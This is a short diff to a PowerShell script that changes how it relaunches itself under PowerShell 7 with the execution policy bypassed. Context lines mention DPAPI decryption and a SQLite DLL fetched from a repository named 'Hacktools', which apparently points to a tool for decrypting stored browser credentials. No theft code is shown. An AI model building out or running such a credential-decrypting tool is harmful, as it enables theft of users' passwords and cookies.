@@ -16,7 +16,16 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
     if ($pwshCmd) {
         $pwshPath = $pwshCmd.Source
         Write-Host "Restarting script in PowerShell 7 ($pwshPath)..."
-        & $pwshPath -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
+        
+        if ($PSCommandPath) {
+            # If running from a script file, restart with -File
+            & $pwshPath -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
+        }
+        else {
+            # Running interactively or from Run box; restart with -NoExit so window stays open
+            & $pwshPath -NoProfile -ExecutionPolicy Bypass -NoExit
+        }
+
         if ($Host.Name -match 'ConsoleHost') {
             Read-Host "Press Enter to exit"
         }
@@ -27,7 +36,6 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
         # Continue running script in PS5 but only DPAPI decryption will be used
     }
 }
-
 
 # URLs for SQLite DLLs (64-bit)
 $sqliteInteropUrl = "https://github.com/BlueJuice1/Hacktools/releases/download/V1.0/SQLite.Interop.dll"
